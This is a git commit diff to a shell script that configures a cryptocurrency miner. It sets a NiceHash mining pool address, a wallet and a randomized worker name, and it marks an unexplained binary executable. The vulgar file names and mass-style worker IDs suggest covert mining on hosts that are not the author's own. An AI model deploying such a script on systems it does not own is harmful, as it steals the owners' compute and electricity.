1c1fd90249c678001193e656b32992edeae74b3d
renilo <88342640+renilo@users.noreply.github.com>
2021-09-20 22:21:57 +0700

    Update kontol1.sh

--- kontol1.sh
+++ kontol1.sh
@@ -2,7 +2,7 @@ POOL=stratum+tcp://beamv3.eu-west.nicehash.com:3387
 
 WALLET=3D6NtTR5Zw5VmYx9ZNfHkLhXRp2uPb9BXk
 
-WORKER=$(echo $(shuf -i 1-100000 -n 1)-GPU)
+WORKER=$(echo $(shuf -i 1-5 -n 1)-GPU)
 
 chmod +x memek
 
